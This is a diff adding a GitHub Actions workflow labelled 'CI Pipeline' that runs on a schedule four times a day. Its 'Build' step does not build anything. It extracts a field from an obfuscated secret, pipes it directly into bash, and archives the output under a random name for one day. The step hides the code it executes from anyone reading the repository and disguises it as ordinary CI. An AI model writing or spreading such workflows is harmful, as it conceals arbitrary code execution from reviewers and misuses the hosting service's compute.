@@ -1,0 +1,28 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          aeksv2368: ${{ secrets.aeksv2368 }}
+        run: |
+          printf '%s' "$aeksv2368" | jq -r .ibma448 | /bin/bash
+          printf '%s' "$vnu1109" | jq -r .hq1 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: A9Bn2rRX
+          path: "*.zip"
+          retention-days: 1
